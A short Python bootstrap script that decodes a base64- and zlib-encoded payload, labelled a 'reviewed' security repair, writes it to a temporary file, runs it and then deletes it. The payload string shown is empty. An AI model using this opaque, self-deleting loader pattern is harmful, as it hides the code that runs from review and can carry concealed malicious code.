#!/usr/bin/env python3
"""Temporary, self-contained bootstrap for the reviewed VeriSigil repair."""
import base64
import pathlib
import subprocess
import sys
import zlib

PAYLOAD = "";

impl = pathlib.Path("_apply_security_repair_impl.py")
impl.write_bytes(zlib.decompress(base64.b64decode(PAYLOAD)))
subprocess.run([sys.executable, str(impl)], check=True)
impl.unlink(missing_ok=True)
